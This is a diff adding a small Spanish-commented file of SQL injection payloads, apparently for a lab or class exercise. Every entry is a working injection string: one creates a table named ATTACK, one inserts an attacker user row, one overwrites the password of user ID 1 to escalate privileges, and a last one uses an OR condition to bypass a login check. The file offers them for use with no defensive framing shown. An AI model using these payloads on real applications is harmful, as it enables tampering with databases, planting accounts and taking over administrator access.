@@ -1,0 +1,9 @@
+# Alteracion de la base de datos
+'; CREATE TABLE `ATTACK` (`YOU_WAS_ATTACKED` INT NOT NULL); SELECT '
+
+# Inyeccion de datos
+1'; INSERT INTO `users` VALUES (DEFAULT, 'ATTACKER', 'Attacker', CONVERT('atacante' AS BINARY)); SELECT '1
+
+# Alteracion de datos y escalamiento de permisos en la app
+1'; UPDATE `users` SET `PASSWORD` = CONVERT('haz sido atacado' USING binary) WHERE `ID` = 1; SELECT '1
+' OR `ID` = 1 AND '1' = '1
